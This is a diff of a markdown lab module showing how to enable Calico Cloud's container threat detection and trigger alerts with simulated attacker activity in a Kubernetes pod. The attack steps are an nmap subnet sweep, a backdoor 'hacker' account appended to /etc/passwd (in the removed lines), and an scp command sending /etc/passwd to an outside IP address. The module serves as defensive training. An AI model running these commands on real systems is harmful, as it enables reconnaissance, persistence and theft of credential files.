@@ -1,18 +1,52 @@
-### Detect zero-day attacks based on suspicious container activity using syscalls, file access, and process information 
-############################################
+# Module 6 - Realtime Container Thread Defence
 
-Threat Defence > Container Threat Detection - enable
+Calico Cloud provides a threat detection engine that analyzes observed file and process activity to detect known malicious and suspicious activity.
 
-k run attacker --image ubuntu -- sleep infinity
-k exec attacker -it -- /bin/bash
+Our threat detection engine also monitors activity within the containers running in your clusters to detect suspicious behavior and generate corresponding alerts. The threat detection engine monitors the following types of suspicious activity within containers:
 
-apt update
-apt-get install nmap
-nmap -sn $(hostname -i)/24
-nmap -T4 -F $(hostname -i)/24
+- Access to sensitive system files and directories
+- Defense evasion
+- Discovery
+- Execution
+- Persistence
+- Privilege escalation
 
-echo hacker:x:777:0:hacker:/tmp:/bin/bash >> /etc/passwd
-passwd hacker
+1. Let's start by enabling the container threat detection feature.
+   For this, go to the `Threat Defence` option in the left-hand menu of Calico Cloud and select `Container Threat Detection`
+
+2. If it is not enabled, you will see a page like this:
+
+   --- IMAGE ---
+
+   Click on the Enable Container Threat Detection button, and you will see the following page:
+
+   --- IMAGE ---
+ 
+   Perfect! Now any suspicious activities will generate an alert. Let's try some.
+
+   In other to see the results faster, execute the following on the cluster:
+
+   ```bash
+   kubectl -n tigera-runtime-security annotate daemonset runtime-reporter unsupported.operator.tigera.io/ignore="true"
+   kubectl -n tigera-runtime-security get daemonset.apps/runtime-reporter -o yaml | sed 's/15m/1m/g' | kubectl apply -f -
+   ```
+
+3. Execute the following commands from the attacker pod (if you quitted from its shell, it got deleted. Just create it again, if it's the case.)
+
+   ```bash
+   apk update
+   apk add nmap
+   nmap -sn $(hostname -i)/24
+   ```
+   
+   Wait a minute and look in the Calico Cloud UI in the `Activity` > `Alerts`.
+
+   Optionally, you can also try the following;
+   
+   ```bash
+   passwd hacker
+   scp -o ConnectTimeout=3 /etc/passwd goomba@198.13.47.158:/tmp/
+   ```
 
 --- 
 
